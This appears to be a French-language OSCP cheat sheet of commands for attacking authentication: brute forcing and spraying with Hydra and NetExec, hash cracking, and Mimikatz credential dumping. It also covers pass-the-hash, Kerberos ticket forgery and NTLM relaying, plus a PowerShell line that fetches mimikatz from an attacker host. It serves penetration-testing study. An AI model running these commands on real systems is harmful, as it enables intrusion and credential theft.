---
title: "OSCP · Mots de passe et authentification"
description: "Analyser les mécanismes d'authentification et les formats de hachage."
---

# OSCP · Mots de passe et authentification

Analyser les mécanismes d'authentification et les formats de hachage.


## Essais de mots de passe


<p class="oscp-command-note">Vérifier des identifiants dans un environnement autorisé.</p>

```bash
# SSH Brute Force
hydra -l <username> -P <wordlist> -s <port> ssh://<target_ip>

# FTP Brute Force
hydra -l <username> -P <wordlist> ftp://<target_ip>

# SMB Brute Force
hydra -L <user_list> -P <password_list> smb://<target_ip>

# Telnet Brute Force
hydra -l <username> -P <wordlist> telnet://<target_ip>

# MySQL Brute Force
hydra -l <username> -P <wordlist> mysql://<target_ip>

# PostgreSQL Brute Force
hydra -l <username> -P <wordlist> postgres://<target_ip>

# VNC Brute Force
hydra -P <password_list> vnc://<target_ip>

# HTTP Basic Authentication Brute Force
hydra -l <username> -P <wordlist> <target_ip> http-get /

# SMTP Brute Force
hydra -l <username> -P <wordlist> smtp://<target_ip>

# SNMP Brute Force
hydra -P <wordlist> snmp://<target_ip>

# Redis Brute Force
hydra -P <password_list> redis://<target_ip>
```


## Password spraying

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Vérifier des identifiants dans un environnement autorisé.</p>

```bash
# Spraying passwords for RDP, one wordlist could be: /usr/share/wordlists/dirb/others/names.txt
hydra -L <user_list> -p "<password>" rdp://<target_ip>
```


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
# WinRM password spraying
crackmapexec winrm <target_ip> -u <user_list> -H <hash_list>

# FTP password spraying
crackmapexec ftp <target_ip> -u <user_list> -p <password_list> -d <domain> --continue-on-success

# SMB password spraying
crackmapexec smb <target_ip> -u <user_list> -p <password_list> -d <domain> --continue-on-success

# RDP password spraying
crackmapexec rdp <target_ip> -u <user_list> -p "<password>" --continue-on-success

# SSH password spraying
crackmapexec ssh <target_ip> -u <user_list> -p <password_list> --d <domain> --continue-on-success

# Multiple targets with WinRM
crackmapexec winrm <target_ip_list> -u <user_list> -H <hash_list> -d <domain> --continue-on-success

# SMTP password spraying
crackmapexec smtp <target_ip> -u <user_list> -p <password_list> --continue-on-success

# POP3 password spraying
crackmapexec pop3 <target_ip> -u <user_list> -p <password_list> --continue-on-success
```


### Fichiers Office


<p class="oscp-command-note">Préparer une empreinte pour John the Ripper.</p>

```bash
# Extract hash from encrypted Office files
office2john <file> > office.hash

# Crack Office file password using John
john --wordlist=<wordlist> office.hash
```


### Fichiers PDF


<p class="oscp-command-note">Préparer une empreinte pour John the Ripper.</p>

```bash
pdf2john <file.pdf> > pdf.txt
```


<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>

```bash
john --wordlist=<wordlist> pdf.txt
```


<p class="oscp-command-note">Exemple avec l&#x27;outil pdfcrack.</p>

```bash
pdfcrack -f <file.pdf> -w <wordlist>
```


### Archives ZIP


<p class="oscp-command-note">Préparer une empreinte pour John the Ripper.</p>

```bash
zip2john <file.zip> > zip.hash
```


<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>

```bash
# (Optional), if the zip has too many files, them extract one and crack just that one to speed things up. If given errors delete the --format=zip.
john zip.hash --wordlist=<wordlist> --format=zip
# Autre possibilité
hashcat -m 13600 zip.hash /path/to/wordlist.txt
```


<p class="oscp-command-note">Exemple avec l&#x27;outil fcrackzip.</p>

```bash
# Perform a brute-force attack on a password-protected ZIP file
fcrackzip -u -D -p <wordlist> <file.zip>
```


## Connexion HTTP POST

Examiner les entrées et les réponses de l'application web.


<p class="oscp-command-note">Vérifier des identifiants dans un environnement autorisé.</p>

```bash
# HTTP POST brute-force using Hydra
hydra -l <username> -P <wordlist> <target_ip> http-post-form "/<login_uri>:<user_field>=<username>&<pass_field>=^PASS^:<failure_message>"
```


<p class="oscp-command-note">Exemple avec l&#x27;outil /.</p>

```text
/<login_uri>
```


<p class="oscp-command-note">Exemple technique pour la rubrique « Connexion HTTP POST ».</p>

```text
<user_field>=<username>&<pass_field>=^PASS^
```


<p class="oscp-command-note">Exemple avec l&#x27;outil fm_usr.</p>

```text
fm_usr=user&fm_pwd=^PASS^
```


<p class="oscp-command-note">Exemple technique pour la rubrique « Connexion HTTP POST ».</p>

```text
<failure_message>
```


<p class="oscp-command-note">Exemple avec l&#x27;outil login.</p>

```text
Login failed. Invalid
```


## Authentification HTTP Basic

Examiner les entrées et les réponses de l'application web.


<p class="oscp-command-note">Vérifier des identifiants dans un environnement autorisé.</p>

```bash
# HTTP GET brute-force attack using Hydra
hydra -l <username> -P <wordlist> <target_ip> http-get /
```


## Estimer le temps de calcul


<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>

```bash
# Calculate keyspace for a password length of <length>
echo -n "<characters>" | wc -c

python3 -c "print(<keyspace>**<length>)"

# Calculate cracking time based on benchmark results
python3 -c "print(<keyspace> / <hash_rate>)"
```


<p class="oscp-command-note">Exemple avec l&#x27;outil characters.</p>

```bash
# Estimate cracking time for a 5-character alphanumeric password
characters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

echo -n $characters | wc -c  # keyspace

python3 -c "print(62**5 / 1000000000)"  # example for 1B hashes per second
```


## Mutating Listes de mots


<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>

```bash
# Using Hashcat with rule-based attacks
hashcat -m <hash_type> <hash_file> <wordlist> -r <rule_file> --force
```


## Modes de hachage Hashcat

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`0` (MD5)  


**MD5**


<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>

```text
$1$salt$hash
```


**Paramètres et repères :**
`100` (SHA-1) · `hash:salt`  


**SHA-1**


**Paramètres et repères :**
`1000` (NTLM)  


**NTLM**


<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>

```text
<NTLM_HASH>
```


**Paramètres et repères :**
`5500` (NetNTLMv1) · `username::domain:challenge:response`  


**Net-NTLMv1**


**Paramètres et repères :**
`5600` (NetNTLMv2) · `username::domain:challenge:response`  


**Net-NTLMv2**


**Paramètres et repères :**
`3200` (bcrypt)  


**bcrypt**


<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>

```text
$2a$10$abcdefghijklmnopqrstuv
```


**Paramètres et repères :**
`13100` (Kerberos TGS-REP)  


**Kerberos 5 TGS-REP etype 23**


<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>

```text
$krb5tgs$23$*user$realm$service*hash
```


**Paramètres et repères :**
`18200` (Kerberos AS-REP)  


**Kerberos 5 AS-REP etype 23**


<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>

```text
$krb5asrep$23$user@REALM:hash
```


**Paramètres et repères :**
`1100` · `username:hash`  


**MS-Cache v1**


**Paramètres et repères :**
`2100`  


**MS-Cache v2**


<p class="oscp-command-note">Exemple avec l&#x27;outil domain.</p>

```text
domain\username:hash:salt
```


**Paramètres et repères :**
`1400`  


**SHA-256**


<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>

```text
<SHA256_HASH>
```


**Paramètres et repères :**
`1700`  


**SHA-512**


<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>

```text
<SHA512_HASH>
```


**Paramètres et repères :**
`5500` (NetNTLMv1) · `username::domain:challenge:response`  


**NTLMv1-ESS**


**Paramètres et repères :**
`500`  


**MD5 Crypt**


<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>

```text
$1$salt$hash
```


**Paramètres et repères :**
`25600`  


**LDAP MD5**


<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>

```text
{MD5}hash
```


**Paramètres et repères :**
`13100` (Kerberos TGS-REP)  


**Kerberos TGS-REP etype 23**


<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>

```text
$krb5tgs$23$user$realm$service$hash
```


**Paramètres et repères :**
`18200` (Kerberos AS-REP)  


**Kerberos AS-REP etype 23**


<p class="oscp-command-note">Exemple technique pour la rubrique « Modes de hachage Hashcat ».</p>

```text
$krb5asrep$23$user@realm:hash
```


## Gestionnaires de mots de passe

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Exemple avec l&#x27;outil get-childitem.</p>

```powershell
# Search for KeePass database (.kdbx) on Windows
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```


<p class="oscp-command-note">Exemple avec l&#x27;outil keepass2john.</p>

```bash
# Convert KeePass database to John format
keepass2john <Database.kdbx> > keepass.hash

# Remember to delete the first "'word':" that says 'Database:'; it should look like this:
# $keepass$*2*60*0*d7bfhs83hFTG338717d27a7d4sucgd54fvfv486d2...... INSTEAD OF Database:$keepass$*2*60*0*d7bfhs83hFTG338717d27a7d4sucgd54fvfv486d2......

# Crack KeePass hash using Hashcat (the rule is optional)
hashcat -m 13400 keepass.hash <wordlist> -r <rule_file> --force
```


<p class="oscp-command-note">Exemple avec l&#x27;outil kpcli.</p>

```bash
# Open the tool
kpcli --kdb=Database.kdbx

# Navigate to the desired database and folder with cd [folder]
cd Database/

# Show contents of database
ls

# Show entries information
show [-f] [-a] <entry_id or entry_path>

# Show a specific field detail of an entry: (example) get 'BACKUP Machine SSH Key' Pass or get 0 Pass
get <entry_path or entry_id> <field_name>
```


## Phrases secrètes SSH


<p class="oscp-command-note">Exemple avec l&#x27;outil chmod.</p>

```bash
# Set correct permissions for SSH private key
chmod 600 <id_rsa>

# Convert SSH key to John format
ssh2john <id_rsa> > ssh.hash

# Crack the SSH key passphrase
john --wordlist=<password_list> --rules=<rules_file> ssh.hash
```


## Empreintes Linux

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`/etc/shadow`  


<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>

```bash
# 1. Identify the hash (can use hashes.com to do it), for example: root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7::: is a SHA-512 because of the $6$ and uses the mode -m 1800.

# 2. Remote the unneeded part, we only need the ':[HASH]:', so in the example above we just need $6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.

# 3. Crack the hash
hashcat -m 1800 [hash_file].txt [path_to_wordlist]
```


### Sans identifiants

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`privilege::debug` · `token::elevate`  


**Élévation de privilèges to SYSTEM**


**Paramètres et repères :**
`lsadump::sam`  


**Dumping Password Hashes from SAM**


**Paramètres et repères :**
`lsadump::secrets`  


**Dumping Credentials from LSA Secrets**


**Paramètres et repères :**
`lsadump::cache`  


**Dumping Domain Cached Credentials (DCC)**


**Paramètres et repères :**
`lsadump::trust`  


**Retrieve trust Authentification information.**


**Paramètres et repères :**
`sekurlsa::tickets`  


**Dumping Kerberos Tickets**


**Extracts Credentials from LSA**


<p class="oscp-command-note">Exemple avec l&#x27;outil lsadump.</p>

```text
lsadump::lsa /inject
```


**Paramètres et repères :**
`sekurlsa::wdigest`  


**Dumping WDIGEST Credentials**


**Paramètres et repères :**
`sekurlsa::logonpasswords`  


**Dumping Clear-Text Credentials**


**Paramètres et repères :**
`sekurlsa::msv`  


**Dumping NTLM Hashes from LSASS Memory**


**Paramètres et repères :**
`sekurlsa::kerberos`  


**Dumping Kerberos Keys**


**Paramètres et repères :**
`sekurlsa::ssp`  


**Dumping SSP Credentials**


**Paramètres et repères :**
`sekurlsa::tspkg`  


**Dumping TSPKG Credentials**


**Paramètres et repères :**
`privilege::list`  


**Listing Available Privileges**


**Extracts Passwords from Windows Vault**


<p class="oscp-command-note">Exemple avec l&#x27;outil vault.</p>

```text
vault::cred /patch
```


**Dumping Security Account Manager (SAM)**


<p class="oscp-command-note">Exemple avec l&#x27;outil lsadump.</p>

```text
lsadump::sam /system:<SYSTEM> /sam:<SAM>
```


**Dumping Hashes from Active Directory**


<p class="oscp-command-note">Exemple avec l&#x27;outil lsadump.</p>

```text
lsadump::dcsync /domain:<DOMAIN> /user:<USERNAME>
```


### Avec identifiants

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Pass-the-Hash Attack (PTH)**


<p class="oscp-command-note">Exemple avec l&#x27;outil sekurlsa.</p>

```text
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<COMMAND>
```


**Pass-the-Ticket Attack (PTT)**


<p class="oscp-command-note">Exemple avec l&#x27;outil kerberos.</p>

```text
kerberos::ptt <ticket.kirbi>
```


**Over-Pass-The-Hash / Pass-The-Key (Kerberos Ticket)**


<p class="oscp-command-note">Exemple avec l&#x27;outil sekurlsa.</p>

```text
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes128:<AES128_HASH> /aes256:<AES256_HASH> /run:<COMMAND>
```


**Golden Ticket Creation**


<p class="oscp-command-note">Exemple avec l&#x27;outil kerberos.</p>

```text
kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:<RID> /ticket:<OUTPUT_TICKET>
```


**Silver Ticket Creation**


<p class="oscp-command-note">Exemple avec l&#x27;outil kerberos.</p>

```text
kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<SERVICE/SERVER> /service:<SERVICE> /rc4:<NTLM_HASH> /id:<USER_RID> /ptt
```


**Dump Kerberos Tickets for Specific User**


<p class="oscp-command-note">Exemple avec l&#x27;outil sekurlsa.</p>

```text
sekurlsa::tickets /export
```


**Paramètres et repères :**
`misc::skeleton` · `mimikatz`  


**Skeleton Key Injection**


**Kerberos Silver Ticket Creation (Avancé)**


<p class="oscp-command-note">Exemple avec l&#x27;outil kerberos.</p>

```text
kerberos::silver /user:<USERNAME> /domain:<DOMAIN> /target:<SERVER> /rc4:<NTLM_HASH> /service:<SERVICE> /sid:<DOMAIN_SID>
```


**Over-Pass-the-Hash (with RC4)**


<p class="oscp-command-note">Exemple avec l&#x27;outil sekurlsa.</p>

```text
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /run:<COMMAND>
```


**DPAPI Credential Decryption**


<p class="oscp-command-note">Exemple avec l&#x27;outil dpapi.</p>

```text
dpapi::cred /in:<CREDENTIAL_FILE>
```


**Paramètres et repères :**
`kerberos::tgt`  


**Extracting TGT from LSASS Memory**


### Mimikatz One-Liners


**Paramètres et repères :**
`Evil-WinRM` · `mimikatz`  


<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>

```powershell
.\mimikatz.exe "privilege::debug" "[command]" "exit"

# Example for Dumping Passwords (using cmd.exe or PowerShell)
mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"

# Example for Passing the Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:domain.local /rc4:HASH" "exit"
```


<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.exe.</p>

```powershell
mimikatz.exe "privilege::debug" "[command]" "exit" > C:\temp\mimikatz_output.txt
```


<p class="oscp-command-note">Exemple technique pour la rubrique « Mimikatz One-Liners ».</p>

```powershell
$command = "privilege::debug [command] exit"
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
echo $encodedCommand

powershell -enc <encodedCommand>
```


<p class="oscp-command-note">Exemple avec l&#x27;outil evil-winrm.</p>

```powershell
# Evil-WinRM (we need to connect and then execute it, not possible to send it within the same command)
evil-winrm -i [target_ip] -u [username] -p [password]
mimikatz.exe 'privilege::debug' '[command]' 'exit'

# PsExec
impacket-psexec DOMAIN/username:password@target_ip "C:\\Windows\\System32\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords' 'exit'"

# VMIExec
impacket-vmiexec DOMAIN/username:password@target_ip "C:\\Windows\\System32\\mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords' 'exit'"

# Web Download
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://[attacker_ip]/mimikatz.exe', 'C:\\temp\\mimikatz.exe')"
powershell -Command "C:\\temp\\mimikatz.exe 'privilege::debug' '[command]' 'exit'"
```


<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.exe.</p>

```powershell
mimikatz.exe "privilege::debug" "[command]" "exit" > nul 2>&1
```


## NTLM


<p class="oscp-command-note">Exemple avec l&#x27;outil ps.</p>

```powershell
PS C:\tools> .\mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK
```


<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>

```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::sam
Domain : <DOMAIN>
SysKey : <SysKey>
Local SID : <Local SID>

RID  : <RID>
User : <USERNAME>
Hash NTLM: <NTLM_HASH>
```


<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>

```bash
# Rule is optional
hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-smbclient.</p>

```bash
# Pass-the-Hash using SMBClient
impacket-smbclient -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>
```


## Pass-The-Hash NTLM

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>

```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
...

mimikatz # lsadump::sam
RID  : <RID>
User : <USERNAME>
Hash NTLM: <NTLM_HASH>
```


<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-psexec.</p>

```bash
# Using smbclient
impacket-psexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>

# Using PsExec
impacket-psexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>

# Using WMIExec
impacket-wmiexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>

# Using xfreerdp
xfreerdp /v:<target_ip> /u:<USERNAME> /pth:<NTLM_HASH> /size:<resolution>
```


## Cracking Net-NTLMv2


<p class="oscp-command-note">Exemple technique pour la rubrique « Cracking Net-NTLMv2 ».</p>

```text
<interface>
```


**Paramètres et repères :**
`eth0` · `wlan0`  


<p class="oscp-command-note">Exemple technique pour la rubrique « Cracking Net-NTLMv2 ».</p>

```text
<responder_ip>
```


```text
<victim_ip>
```


```text
<DOMAIN>
```


```text
<hash_file>
```


<p class="oscp-command-note">Exemple avec l&#x27;outil responder.</p>

```bash
sudo responder -I <interface>
```


<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>

```powershell
C:\Windows\system32> dir \\<responder_ip>\test
dir \\<responder_ip>\test
Access is denied.
```


<p class="oscp-command-note">Exemple technique pour la rubrique « Cracking Net-NTLMv2 ».</p>

```bash
[SMB] NTLMv2-SSP Client   : ::ffff:<victim_ip>
[SMB] NTLMv2-SSP Username : <DOMAIN>\emma
[SMB] NTLMv2-SSP Hash     : emma::<DOMAIN>:<NTLM_HASH>
```


**Paramètres et repères :**
`5600`  


<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>

```bash
hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting
...
<DOMAIN>\emma::<NTLM_HASH>:123Password123
...
```


## Relaying Net-NTLMv2


**Paramètres et repères :**
`ntlmrelayx`  


<p class="oscp-command-note">Exemple technique pour la rubrique « Relaying Net-NTLMv2 ».</p>

```text
<target_ip>
```


<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-ntlmrelayx.</p>

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c "powershell -enc <base64_encoded_powershell_command_to_be_executed_on_the_target_machine>"

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```


<p class="oscp-command-note">Exemple technique pour la rubrique « Relaying Net-NTLMv2 ».</p>

```bash
[*] SMBD-Thread-4: Received connection from <victim_ip>, attacking target smb://<target_ip>
[*] Authenticating against smb://<target_ip> as <domain>/<username> SUCCEED
[*] SMBD-Thread-6: Connection from <victim_ip> controlled, but there are no more targets left!
...
[*] Executed specified command on host: <target_ip>
```


<p class="oscp-command-note">Tester ou établir une connexion réseau avec Netcat.</p>

```bash
# The port should match the port specified in the reverse shell command
nc -nvlp [port]
```


<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>

```powershell
# <responder_ip>: IP address of the machine running the Responder server.
C:\Windows\system32> dir \\<responder_ip>\test
```


## Default Credentials

Vérifier les comptes, les secrets et les mécanismes d'authentification.


### Database Tool


<p class="oscp-command-note">Exemple avec l&#x27;outil pip3.</p>

```bash
sudo pip3 install defaultcreds-cheat-sheet
```


<p class="oscp-command-note">Exemple avec l&#x27;outil creds.</p>

```bash
creds search [service/web_server/term]

# Example:
creds search tomcat
+----------------------------------+------------+------------+
| Product                          |  username  |  password  |
+----------------------------------+------------+------------+
| apache tomcat (web)              |   tomcat   |   tomcat   |
| apache tomcat (web)              |   admin    |   admin    |
+----------------------------------+------------+------------+
```


```bash
creds search [service/web_server/term] export
```


```bash
creds update
```


```bash
# Search for product creds
creds search [service/web_server/term] --proxy=http://localhost:8080

# update records
creds update --proxy=http://localhost:8080

# Example: Search for Tomcat creds and export results to /tmp/tomcat-usernames.txt , /tmp/tomcat-passwords.txt
creds search tomcat --proxy=http://localhost:8080 export
```


### Most Common Credentials

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Exemple avec l&#x27;outil root.</p>

```text
# Commonly guessed or default credentials
root:root                # Default root credentials
admin@example.com:admin  # Common admin credentials for email accounts
admin:admin              # Standard admin/admin credentials
USERK:USERK              # Credentials matching the box name (e.g., a target machine's name)
cassie:cassie            # Credentials found using exiftool or similar methods

# Additional Default Credentials
admin:password           # Standard admin/password credentials
admin:1234               # Admin credentials with simple numeric password
administrator:admin      # Default admin credentials for Windows systems
admin:admin123           # Common admin credentials with variations
guest:guest              # Default guest credentials for various systems
user:user                # Basic user credentials
test:test                # Test account credentials
support:support          # Default support account credentials
manager:manager          # Common manager credentials
operator:operator        # Default operator credentials
service:service          # Default service account credentials
postgres:postgres        # Default PostgreSQL credentials
mysql:mysql              # Default MySQL credentials
```


### Strategies for Effective Password Guessing

Vérifier les comptes, les secrets et les mécanismes d'authentification.


**Paramètres et repères :**
`USERK:USERK` · `exiftool`  


## Recommended Listes de mots


**Paramètres et repères :**
`/usr/share/wordlists/rockyou.txt`  


<p class="oscp-command-note">Exemple technique pour la rubrique « Recommended Listes de mots ».</p>

```text
/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```


```text
/usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
```


```text
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```


```text
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```


**Paramètres et repères :**
`/usr/share/dirb/wordlists/common.txt` · `/usr/share/dirb/wordlists/big.txt`  


<p class="oscp-command-note">Exemple technique pour la rubrique « Recommended Listes de mots ».</p>

```text
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt
```


### Énumération


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb target
```


```bash
netexec smb target -u '' -p ''
```


```bash
netexec smb target -u 'guest' -p ''
```


```bash
netexec smb target -u '' -p '' --shares

netexec smb target -u [username] -p [password] --shares

netexec smb target --shares --policies
```


```bash
netexec smb target --groups
```


```bash
netexec smb target -u '' -p '' --users

netexec smb target -u [username] -p [password] --users

netexec smb target -u '' -p '' --rid-brute

netexec smb target -u '' -p '' --rid-brute --rid-range 500-1100
```


### Spraying


**FTP**

No check


**SSH**

Root (otherwise specific message) ✅


**WinRM**

Code execution at least 👾


**LDAP**

Path to domain admin 👑


**SMB**

Most likely local admin ✅


**RDP**

Code execution at least 👾


**VNC**

Code execution at least 👾


**WMI**

Most likely local admin ✅


**MSSQL**

------


**NFS**

------


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb target -u [username] -p '[P@$$w0rd!]'
netexec smb target -u [username] -p 'password with spaces'
```


```bash
# Using Passwords
netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt

netexec [protocol] [target(s)] -u [usernames].txt -p [passwords].txt --local-auth

netexec [protocol] [target(s)] -u username1 -p password1 password2

netexec [protocol] [target(s)] -u username1 username2 -p password1

# Using NTLM Hashes
netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt

netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --local-auth

# SMB Specific
netexec smb target -u [usernames].txt -p [password] --continue-on-success

netexec smb target -u [usernames].txt -p [password]s.txt --no-bruteforce --continue-on-success

# SSH
netexec ssh target -u [username] -p [password] --continue-on-success
```


```bash
netexec [protocol] [target(s)] -u [usernames].txt -p [passwords.txt] --no-bruteforce

netexec [protocol] [target(s)] -u [usernames].txt -H [ntlm_hashes].txt --no-bruteforce
```


<p class="oscp-command-note">Exemple avec l&#x27;outil user1.</p>

```text
user1 -> pass1
user2 -> pass2
```


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb target -u [username] -p '[password]' --local-auth
netexec smb [target] -u [username] -H '[LM:NT]' --local-auth
netexec smb [target] -u [username] -H '[NTHASH]' --local-auth

# Examples
netexec smb [target] -u '' -p '' --local-auth
netexec smb [target] -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
netexec smb [target] -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
```


**Paramètres et repères :**
`-k`  


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb target -u [username] -p [password] -k
```


### SMB

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb target -u [username] -p [password] --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
```


```bash
netexec smb target -u [username] -p [password] -M spider_plus

netexec smb target -u [username] -p [password] -M spider_plus -o READ_ONLY=false
```


```bash
netexec smb target -u [username] -p [password] -k --get-file target_file output_file --share sharename
```


### FTP

Transférer ou récupérer des fichiers dans le laboratoire.


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec ftp target -u [username] -p [password] --ls
```


```bash
netexec ftp target -u [username] -p [password] --ls folder_name
```


```bash
netexec ftp target -u [username] -p [password] --ls folder_name --get file_name
```


### LDAP

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec ldap target -u '' -p '' --users
```


```bash
netexec ldap target -u [username] -p [password] --trusted-for-delegation  --[password]-not-required --admin-count --users --groups
```


```bash
netexec ldap target -u [username] -p [password] --kerberoasting kerb.txt
```


```bash
netexec ldap target -u [username] -p [password] --asreproast asrep.txt
```


### MSSQL

Examiner les connexions, la configuration et les requêtes de la base de données.


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec mssql target -u [username] -p [password]
```


**Paramètres et repères :**
`xp_cmdshell` · `-X` · `-x`  


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec mssql target -u [username] -p [password] -x [command_to_execute]
```


```bash
netexec mssql target -u [username] -p [password] --get-file output_file target_file
```


### Secrets Dump


<p class="oscp-command-note">Exemple avec l&#x27;outil nxc.</p>

```bash
nxc smb target -u [username] -p [password] --sam
```


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec smb target -u [username] -p [password] --local-auth --lsa

# If you found an account starting with _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7} you can get the account behind, by using gMSA below.
```


```bash
netexec smb target -u [username] -p [password] --ntds
```


<p class="oscp-command-note">Exemple avec l&#x27;outil nxc.</p>

```bash
# Using Lsassy
nxc smb target -u [username] -p [password] -M lsassy

# Using nanodump
nxc smb target -u [username] -p [password] -M nanodump

# Using Mimikatz (deprectaed): you need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
nxc smb target -u [username] -p [password] -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
```


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
netexec ldap target -u [username] -p [password] --gmsa-convert-id id

netexec ldap domain -u [username] -p [password] --gmsa-decrypt-lsa gmsa_account
```


```bash
netexec smb [target] -u [username] -p [password] -M gpp_[password]
```


```bash
netexec smb [target] -u [username] -p [password] --laps
```


**Paramètres et repères :**
`dpapi`  


<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>

```bash
